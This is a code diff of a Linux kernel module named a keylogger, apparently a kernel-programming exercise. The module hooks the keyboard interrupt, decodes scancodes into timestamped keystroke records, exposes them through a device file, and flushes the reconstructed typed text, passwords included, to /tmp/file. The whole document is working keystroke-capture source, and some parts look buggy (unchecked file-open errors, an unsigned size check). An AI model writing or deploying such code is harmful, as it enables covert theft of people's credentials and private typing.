@@ -6,7 +6,9 @@ static unsigned int scan_array[SIZE];
 
 DEFINE_RWLOCK(keyboard_rwlock);
 
-DEFINE_RWLOCK(keylist_rwlock);
+DEFINE_SPINLOCK(keylist_lock);
+
+static unsigned int flag_wait;
 
 static unsigned int windex = -1;
 
@@ -22,59 +24,116 @@ static struct fsm scan_fsm = {
 
 LIST_HEAD(keystroke_list);
 
+#define K_SIZE		500
+
+static unsigned char	SWITCH_ASCII(unsigned char key)
+{
+	if (key == ENTER)
+		key = 10;
+	return key;
+}
+
+static void		ks_list_flush(void)
+{
+	struct keystroke	*ks = NULL;
+	struct keystroke 	*n = NULL;
+	struct file		*file;
+	mm_segment_t		old_fs;
+	loff_t			off = 0;
+	size_t			i = 0;
+	size_t			size = 0;
+	char			buf[600 + 1];
+	struct quickstack	s[600];
+	
+	memset(s, 0, sizeof(struct quickstack) * 600);
+	spin_lock(&keylist_lock);
+	list_for_each_entry_safe(ks, n, &keystroke_list, list) {
+		if (i < 600) {
+			s[i].state = ks->state;
+			s[i].ascii = (char)ks->ascii;
+		}
+		list_del(&ks->list);
+		kfree(ks);
+		i++;
+	}
+	spin_unlock(&keylist_lock);
+
+
+	memset(buf, 0, 600 + 1);
+	i = 0;
+	while (s[i].ascii && i < 600) {
+		s[i].ascii = SWITCH_ASCII(s[i].ascii);
+		if (s[i].state == PRESSED && ((s[i].ascii >= 32 && s[i].ascii <= 127) 
+			|| s[i].ascii == 10 || s[i].ascii == 9)) {
+			strncat(buf, (char *)&s[i].ascii, 1);
+		}
+		else if (s[i].state == PRESSED && s[i].ascii == 8) {
+			size = strlen(buf);
+			size = ((size - 1) > 0) ? size - 1 : 0;
+			buf[size] = 0;
+		}
+		i++;
+	}
+
+	old_fs = get_fs();
+	set_fs(KERNEL_DS);
+
+	if ((file = filp_open("/tmp/file", O_WRONLY | O_CREAT | O_APPEND, 0644))) {
+		if (kernel_write(file, buf, strlen(buf), &file->f_pos) < 0)
+			printk("keylogger : error write into /tmp/file");
+		else {
+			fput(file);
+		}
+	}
+	filp_close(file, 0);
+	set_fs(old_fs);
+
+	return;
+}
+
 /* Assumption : multi buffer, multi flush  */
 
 int	keylogger_open(struct inode *inode, struct file *filp)
 {
-	struct list_head 	*pos;
 	struct keystroke	*ks = NULL;
 	ssize_t			size = 0;
 	char			tmp[60];
 	int			retval = 0;
 	ssize_t			written;
-	char			*klg_buffer = NULL;
+	char			*klg_buffer;
 
-	read_lock(&keylist_rwlock);
-	list_for_each(pos, &keystroke_list) {
-		size++;
+	if (!(klg_buffer = kmalloc(60 * K_SIZE + 1, GFP_KERNEL))) {
+		retval = -ENOMEM;
+		goto err;
 	}
-	read_unlock(&keylist_rwlock);
+
+	memset(tmp, 0, 60);
+	memset(klg_buffer, 0, 60 * K_SIZE + 1);
+	spin_lock(&keylist_lock);
+	list_for_each_entry(ks, &keystroke_list, list) {
+		if (size == K_SIZE)
+			break;
+		written = sprintf(tmp, "[%04d-%02d-%02d %02d:%02d:%02d] %s %s %x\n", ks->tm.tm_year + 1900,
+			ks->tm.tm_mon + 1, ks->tm.tm_mday, ks->tm.tm_hour, ks->tm.tm_min, ks->tm.tm_sec,
+			ks->name, (ks->state == 0) ? "PRESSED" : "RELEASED", ks->ascii);
+		strncat(klg_buffer, tmp, written);
+		size++;
+	} 
+	spin_unlock(&keylist_lock);
+
+	if (size == K_SIZE)
+		ks_list_flush();
 
 	if (size == 0) {
 		retval = -ENODATA;
 		goto err;
 	}
 
-	/* printk(KERN_INFO "nbr entries %lu\n", size); */
-	if (!(klg_buffer = kmalloc(60 * size + 1, GFP_KERNEL))) {
-		retval = -ENOMEM;
-		goto err;
-	}
-
-	memset(tmp, 0, 60);
-	memset(klg_buffer, 0, 60 * size + 1);
-	read_lock(&keylist_rwlock);
-	list_for_each_entry(ks, &keystroke_list, list) {
-		written = sprintf(tmp, "[%04d-%02d-%02d %02d:%02d:%02d] %s %s %x\n", ks->tm.tm_year + 1900,
-			ks->tm.tm_mon + 1, ks->tm.tm_mday, ks->tm.tm_hour, ks->tm.tm_min, ks->tm.tm_sec,
-			ks->name, (ks->state == 0) ? "PRESSED" : "RELEASED", ks->ascii);
-		strncat(klg_buffer, tmp, written);
-	}
-	read_unlock(&keylist_rwlock);
-
 	filp->private_data = klg_buffer;
 
 	return retval;
 err:
 	return retval;
-}
-
-int	keylogger_flush(struct file *filp, fl_owner_t id)
-{
-	/* printk(KERN_INFO "flushing klg_buffer\n"); */
-	kfree(filp->private_data);
-
-	return 0;
 }
 
 /* offset is shared between struct file ?*/
@@ -116,6 +175,13 @@ out :
 	return retval;
 }
 
+int	keylogger_flush(struct file *filp, fl_owner_t id)
+{
+	kfree(filp->private_data);
+
+	return 0;
+}
+
 static struct file_operations keylogger_misc_fops = {
 	.open = keylogger_open,
 	.read = keylogger_read,
@@ -141,12 +207,14 @@ static void do_tasklet(unsigned long unused)
 		read_lock(&keyboard_rwlock);
 		packet = scan_array[rindex++];
 		read_unlock(&keyboard_rwlock);
-		/* printk(KERN_INFO "tasklet : [%x]\n", packet); */
 		if (!(rindex = (rindex == SIZE) ? 0 : rindex))
 			target = windex;
 		scan_fsm_update(&scan_fsm, packet);
-		if (scan_fsm.state == SUCCESS)
-			scan_fsm_send(&scan_fsm, &keystroke_list, &keylist_rwlock);
+		if (scan_fsm.state == SUCCESS) {
+			/*spin_lock(&keylist_lock); */
+			scan_fsm_send(&scan_fsm, &keystroke_list);
+			/*spin_unlock(&keylist_lock); */
+		}
 		if (scan_fsm.state == ERROR || scan_fsm.state == SUCCESS)
 			scan_fsm_clear(&scan_fsm);
 	}
@@ -197,65 +265,6 @@ err:
 	misc_deregister(&keylogger_misc);
 	free_irq(KEYBOARD_IRQ, id);
 	return result;
-}
-
-static unsigned char	SWITCH_ASCII(unsigned char key)
-{
-	if (key == ENTER)
-		key = 10;
-	return key;
-}
-
-static void		ks_list_flush(void)
-{
-	struct list_head 	*pos;
-	struct keystroke	*ks = NULL;
-	struct keystroke 	*n = NULL;
-	struct file		*file;
-	mm_segment_t		old_fs;
-	loff_t			off = 0;
-	ssize_t			size = 0;
-	char			*buf = NULL;
-	char			*tmp;
-	
-	list_for_each(pos, &keystroke_list) {
-		size++;
-	}
-
-	if (!(buf = kmalloc(size + 1, GFP_KERNEL)))
-		goto err;
-	memset(buf, 0, size + 1);
-
-	list_for_each_entry_safe(ks, n, &keystroke_list, list) {
-		ks->ascii = SWITCH_ASCII(ks->ascii);
-		if (ks->state == PRESSED && ((ks->ascii >= 32 && ks->ascii <= 127) 
-			|| ks->ascii == 10 || ks->ascii == 9)) {
-			strncat(buf, (char *)&ks->ascii, 1);
-		}
-		else if (ks->state == PRESSED && ks->ascii == 8) {
-			size = strlen(buf);
-			size = ((size - 1) > 0) ? size - 1 : 0;
-			buf[size] = 0;
-		}
-		list_del(&ks->list);
-		kfree(ks);
-	}
-
-	tmp = buf;
-	old_fs = get_fs();
-	set_fs(KERNEL_DS);
-
-	if ((file = filp_open("/tmp/file", O_WRONLY | O_CREAT | O_TRUNC, 0644))) {
-		if (kernel_write(file, buf, strlen(buf), &off) < 0)
-			printk("keylogger : error write into /tmp/file");
-		else
-			fput(file);
-	}
-	filp_close(file, 0);
-	set_fs(old_fs);
-	kfree(tmp);
-err:
-	return;
 }
 
 static void __exit 	keylogger_cleanup(void)
